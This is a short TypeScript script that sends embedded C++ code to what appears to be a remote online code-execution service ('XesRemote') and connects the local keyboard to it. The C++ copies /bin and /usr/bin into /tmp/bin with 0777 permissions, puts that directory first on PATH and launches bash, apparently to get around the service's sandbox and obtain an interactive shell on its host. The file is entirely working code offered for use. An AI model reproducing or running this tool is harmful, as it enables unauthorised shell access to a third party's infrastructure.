import { Language, MsgType, MsgEvent, XesRemote } from '../xesremote'
import readline from 'readline'
const f = `
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#include <string>
#include <stdexcept>

namespace XesExtended {
void CopyFolder(const std::string& sourcePath, const std::string& destPath) {
  struct dirent* filename = NULL;
  if (opendir(destPath.c_str()) == 0 && mkdir(destPath.c_str(), 0777) < 0)
    throw std::runtime_error("failed to opendir&mkdir");
  DIR* dp = opendir(sourcePath.c_str());
  while ((filename = readdir(dp)) != NULL) {
    FILE *pSrc = fopen((sourcePath + filename->d_name).c_str(), "rb"),
         *pDes = fopen((destPath + filename->d_name).c_str(), "wb+");
    if (pSrc && pDes) {
      int nLen = 0;
      char szBuf[1024] = {0};
      while ((nLen = fread(szBuf, 1, sizeof szBuf, pSrc)) > 0) {
        fwrite(szBuf, 1, nLen, pDes);
      }
      fclose(pSrc), fclose(pDes);
      chmod((destPath + filename->d_name).c_str(), 0777);
    }
  }
  closedir(dp);
}
void init() {
  CopyFolder("/bin/", "/tmp/bin/");
  CopyFolder("/usr/bin/", "/tmp/bin/");
  setenv("PATH", std::string(std::string("/tmp/bin:") + getenv("PATH")).c_str(),
         1);
}
}  // namespace XesExtended
#include<iostream>
int main(int argc, char** argv) {
  XesExtended::init();
  system("bash");
}
`
;(async () => {
  let s = new XesRemote(Language.Cpp, f, true)
  s.onmessage = async (ev: MsgEvent): Promise<void> => {
    if (ev.type == MsgType.Output) {
      await new Promise<void>(resolve => {
        process.stdout.write(ev.data, () => resolve())
      })
    } else if (ev.type == MsgType.System) {
      console.log('system:' + ev.data.toString())
    }
  }
  s.onopen = async (): Promise<void> => {
    readline.emitKeypressEvents(process.stdin)
    process.stdin.setRawMode(true)
    process.stdin.on('data', async data => {
      await s.send(data)
    })
  }
  s.onclose = async (): Promise<void> => {
    console.log('remote connection closed')
    process.exit(0)
  }
})()
